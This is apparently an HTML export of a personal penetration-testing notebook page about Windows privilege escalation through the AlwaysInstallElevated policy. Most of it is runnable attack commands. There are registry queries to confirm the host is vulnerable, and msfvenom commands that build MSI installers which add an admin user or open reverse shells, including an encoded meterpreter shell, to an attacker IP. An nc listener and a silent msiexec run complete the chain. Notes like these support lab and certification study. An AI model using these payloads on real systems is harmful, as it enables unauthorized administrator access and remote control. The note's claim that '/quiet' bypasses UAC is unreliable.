<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>manually</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>manually</h1><br/><br />1. To know if the <span style="text-decoration:underline;">target system is vulnerable</span> we have to check these registry keys:<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg query HKCU<span style="color:#ff9d00;font-weight:700">\</span>SOFTWARE<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>Installer <span style="color:#ff9d00;font-weight:700">/</span>v AlwaysInstallElevated<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg query HKLM<span style="color:#ff9d00;font-weight:700">\</span>SOFTWARE<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>Installer <span style="color:#ff9d00;font-weight:700">/</span>v AlwaysInstallElevated</pre></div><br />    <a href=""><img src="images/932-1.png" alt="images/932-1.png" /></a><br />    Both keys are 1, this mean that the target host is vulnerable!<br />2. Now we can generate different types of payloads with msfvenom:<br />   ◇ payload to add an user<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>adduser USER=admin PASS=password -f msi -o filename.msi</pre></div><br />   ◇ create a reverse shell for x63 Windows<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>shell_reverse_tcp LHOST=192.168.147.139 LPORT=53 -f msi -o reverse.msi  <span style="color:#0088ff;font-weight:400">#lhost is the attacker</span></pre></div><br />        <a href=""><img src="images/932-2.png" alt="images/932-2.png" /></a><br />   ◇ create a reverse shell for meterpreter<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_https -e x86<span style="color:#ff9d00;font-weight:700">/</span>shikata_ga_nai LHOST=[LHOST IP] LPORT=443 -f msi -o filename.msi</pre></div><br /><br />3. Copy the .msi file on the target Windows machine<br />4. Set up a listener on the kali machine(if we have used a reverse shell)<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />5. execute the msi installer specified before on the target system<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; msiexec <span style="color:#ff9d00;font-weight:700">/</span>quiet <span style="color:#ff9d00;font-weight:700">/</span>qn <span style="color:#ff9d00;font-weight:700">/</span>i C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>user<span style="color:#ff9d00;font-weight:700">\</span>Desktop<span style="color:#ff9d00;font-weight:700">\</span>reverse.msi</pre></div><br />    /quiet → flag that will bypass UAC<br />    /qn → flag that specifies to not use a GUI<br />    /i → flag that is to perform a regular installation of the referenced package<br />    <a href=""><img src="images/932-3.png" alt="images/932-3.png" /></a></div>
</body>
</html>
